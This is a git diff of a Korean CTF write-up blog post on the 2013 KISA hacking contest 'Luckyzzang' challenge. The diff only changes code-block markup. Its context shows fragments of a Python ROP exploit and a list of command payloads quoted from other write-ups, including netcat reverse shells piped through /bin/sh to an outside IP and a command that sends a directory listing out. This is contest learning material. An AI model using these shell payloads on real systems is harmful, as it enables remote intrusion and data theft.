@@ -4,7 +4,7 @@ title: KISA 해킹방어대회 2013 5번(Luckyzzang)
 comments: true
 ---
 
-{% highlight python %}
+```python
 import socket, struct
 p  = lambda x: struct.pack('<L', x)
 up = lambda x: struct.unpack('<L', x)[0]
@@ -66,7 +66,7 @@ print 'wait recv'
 print s.recv(1024)
 
 s.close()
-{% endhighlight %}
+```
 
 문제를 푸는 방법은 정말 많지만 내가 풀 방법은 매우 간단한 ROP이다. 
 
@@ -88,10 +88,10 @@ rand()에 따라 사이즈가 recv하는 크기가 변동하는데 그 범위는
 
 그리고 command의 경우는 예전에 BOB에서 배웠던 방식을 그대로 했던 것인데 다른 풀이를 봤을때는 다음과 같은 command가 있더라.
 
-{% highlight python %}
+```python
 cmd = "cat key>&4\x00" # <http://blog.tunz.kr/62>
 cmd = "ls |nc <IP> 10101" # <http://yumere.tistory.com/entry/2013-HDCON-5%EB%B2%88-luckyzzang-exploit>
 cmd = "nc 192.168.32.43 9090 |/bin/sh |nc 192.168.32.43 9091;" # <http://blog.sweetchip.kr/321> 헉
 cmd = "/bin/sh -i <&4 >&4 2>&4" # <http://gooverto.tistory.com/entry/hdcon-luckyzzang-r2dl-exploit>
 # 추가 제보 부탁드립니당 ㅎㅎ
-{% endhighlight %}
+```
